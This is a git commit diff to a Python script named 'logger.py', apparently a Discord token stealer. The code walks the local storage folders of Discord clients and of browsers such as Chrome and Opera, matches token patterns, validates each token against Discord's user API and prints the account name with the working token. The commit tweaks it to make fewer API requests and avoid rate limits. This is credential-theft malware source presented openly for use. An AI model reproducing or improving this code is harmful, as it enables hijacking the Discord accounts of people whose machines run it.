ae90aea5240a97cc3272e92b7bd01914d34211fc
Roblox Thot <67937010+Roblox-Thot@users.noreply.github.com>
2022-01-10 01:11:16 -0500

    Tiny update
    Made it have only 1 Discord request as to try and not get rate-limited.
    Split Discord clients and browsers.

--- logger.py
+++ logger.py
@@ -29,18 +29,22 @@ def findToken(dbPattern):
                     continue
                 if any(pattern.match(field) for pattern in tokenPatterns):
                     #Check if the token works
+                    req = requests.get("https://discord.com/api/users/@me", headers={'authorization': str(field)})
                     if requests.get("https://discord.com/api/users/@me", headers={'authorization': str(field)}).status_code == 200:
                         #Return working token
-                        return field
+                        return field, req.json()
     #Return error of no tokens if none are found
     raise Exception("Couldn't find any Discord token.")
 
 #List of places I know that have Tokens
 cookieLoctions = {
+    #Discord Clients
     "Discord": os.environ["APPDATA"] + "/discord",
     "Canary": os.environ["APPDATA"] + "/discordcanary",
     "Dev": os.environ["APPDATA"] + "/discorddevelopment",
     "LightCord": os.environ["APPDATA"] + "/Lightcord",
+    
+    #Browsers
     "Opera": os.environ["APPDATA"] + '/Opera Software/Opera Stable',
     "Opera GX": os.environ["APPDATA"] + '/Opera Software/Opera GX Stable',
     "Chrome": os.environ["LOCALAPPDATA"] + "/Google/Chrome/User Data/Default",
@@ -56,10 +60,10 @@ for platform, path in cookieLoctions.items():
 
     try:
         #Run token finder
-        token = findToken(f'{path}/Local Storage/leveldb/*.ldb')
+        token, info = findToken(f'{path}/Local Storage/leveldb/*.ldb')
 
         #Get token info
-        info = requests.get("https://discord.com/api/users/@me", headers={'authorization': str(token)}).json()
+        #info = requests.get("https://discord.com/api/users/@me", headers={'authorization': str(token)})
         #print out the info
         print(f'{platform} "{info["username"]}#{info["discriminator"]}": {token}')
     except:
